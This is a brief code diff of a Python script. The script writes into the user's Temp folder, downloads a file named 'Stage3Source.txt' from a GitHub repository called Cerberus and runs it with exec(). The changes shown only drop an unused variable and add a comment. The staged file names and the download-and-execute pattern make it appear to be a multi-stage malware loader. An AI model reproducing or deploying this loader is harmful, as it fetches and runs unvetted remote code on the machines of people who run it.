@@ -2,8 +2,6 @@ import os.path
 import urllib.request
 from bs4 import BeautifulSoup
 
-x = os.getlogin()
-
 path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1.py")
 
 if os.path.isfile(path) == False:
@@ -17,4 +15,4 @@ with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerber
 
 urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage3Source.txt", path)
 
-exec(open(path).read())
+exec(open(path).read()) # Runs stage 3 file
